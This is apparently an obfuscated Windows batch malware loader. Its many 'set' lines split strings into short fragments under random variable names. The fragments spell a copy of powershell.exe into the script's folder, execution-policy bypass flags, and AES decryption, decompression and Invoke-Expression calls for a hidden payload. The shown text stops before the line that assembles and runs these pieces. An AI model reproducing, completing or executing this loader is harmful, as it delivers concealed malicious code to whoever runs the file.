@echo off
set "bNtfetUcAF=co"
set "vhRPOuQGLG=s\"
set "UNAZAihQty=\W"
set "IxTNMdViyS=ll"
set "jEQVXIIrga=.e"
set "SrxaDARZNM=:\"
set "mJHXzKhQmY=Po"
set "NsTWGqADBN=po"
set "LMQkFZpXZO=y "
set "EgSWxNbElQ=he"
set "puWakuYqpD=we"
set "LRRcgKcPpL=in"
set "ChHqNlgeAH=0\"
set "jhSBdyofqs=Wi"
set "KfKBQGUodO=rs"
set "BrQlGsEEZM=nd"
set "PDutOLAlts=ll"
set "ztVUWuAawl=em"
set "CJiOfrdaEH= C"
set "gUBRgjavBS=1."
set "dXKmgBAlul=Sy"
set "BYTtIsjmMl=32"
set "UxrxWnlWOM= /"
set "MwVOVngFCY=py"
set "RguBzrSRJY=he"
set "gymySVcCnF=we"
set "vlANjZGpbe=xe"
set "fxmENMSVuO=ws"
set "NBFRZLltEl=\v"
set "VnZbwpJZPI=st"
set "qTyTMvZVkv=ow"
set "OByosoEnpu=rS"
set "bzOjJWtGse=do"
set "qTuNMgqysr=cd"
set "uAfjdYdpxN= %~dp0"
set "dBqCCIlnrr=Rg ="
set "UunDDJCSnW=fF ="
set "gcTVlUWOxu=F'[-"
set "ZCuazpaRyT=ew-O"
set "XpMWeRPlsx=V = "
set "FHlbEgOKUz=Obje"
set "rvrYofpRJi=g = "
set "dKzrjVQPSu=.Cry"
set "hKJXCKqszo=, (,"
set "AjSGbacTwb=Star"
set "OBGYfnZFoW=-joi"
set "zkdjHSyNIo=Disp"
set "rZeCaLtQDt=fui "
set "fqLjoUUBpQ=ose("
set "uREFYxiHgg= if "
set "ObEjrUFWxG=y.Cr"
set "ZQDTLAhwBD=s75K"
set "NtHyUBnkdR=a.Pa"
set "MxmjtNSGHn=am;$"
set "rFVXOokSmw=]::("
set "WApXMFsBBR=nage"
set "eJFqOYNYHj= = N"
set "VJKyiofDpr=);$N"
set "BauVPQfEPf===')"
set "ejYmpgXsNM=$Ndp"
set "qhMeVjtolh=;$BY"
set "vALaeQiYqs=Stre"
set "nSPiLMtUdW=.Cry"
set "XaamWNQlQV=$BYl"
set "yEuIhHDxHq=, $y"
set "TfzhQzpmVp=onve"
set "jniDGobphm=[]] "
set "gVsnuGPAYE=New-"
set "ciJcHAUytc=grap"
set "xXzIpwCQdB='0Pg"
set "newNEmBTIU=YxVw"
set "jzBGusWFiS=bypa"
set "DaSmfsgYCq=;$Vj"
set "eXAhGcLcIa=y.Pa"
set "qaTmFNIhZw=ach "
set "qSBzRQTJIW=6esa"
set "CmQQwskCzV=ddin"
set "WnVsCbLOhJ=($xd"
set "bgaUpvsett=e]::"
set "rRCDrPWDiP=-Obj"
set "eVlryJiVZz=-nop"
set "alSzmAeCtm=.Dis"
set "qWjsNloDwT=ptog"
set "xyenmwAfAv=in $"
set "CpOelBkClE=raph"
set "kxydUXgsPw=VjUl"
set "yKwtJGwPYR=n ''"
set "RTmOdWPxcP=F.En"
set "gStSUshsIs=;$BY"
set "UemnogqitS=n ''"
set "qFNtdcZHGc=Rg.T"
set "zGyckphOnW=Comp"
set "ApLEuoUtaD='[-1"
set "TNXonubUsn=;$IX"
set "vFjvqgaQBu=stem"
set "IWxObcnpfX=]::("
set "VvBRPTQKun=NdpE"
set "WEFEMyHVPC=dpEa"
set "CWjckEKXyY=.Com"
set "vXjSBrtwSi=Syst"
set "jPhOFeEcKL=rity"
set "NbGBzUPjBr=ress"
set "eALpykVkFT='[-1"
set "rRMNlbLGJX=UlF "
set "aibxthSeYf=[Env"
set "RxThMJyiFm=gMod"
set "onIvkzieEZ= = $"
set "WzUhLmUkPX=('Tg"
set "hBHqfpJWDc=.Mod"
set "YezFglFhiw=ylxI"
set "LHYjRcswlT=$QKG"
set "qNaJrHuzCm=rtS4"
set "gdnkAJWhOI= = ["
set "hMhGupsYLh=.IO."
set "iTsAZDgxvn=oL'["
set "dHGJoVUKax=Fina"
set "IyHCHudVFN=PTtG"
set "HOMTHtMDYh=1..-"
set "ictqYsjsSO=] -j"
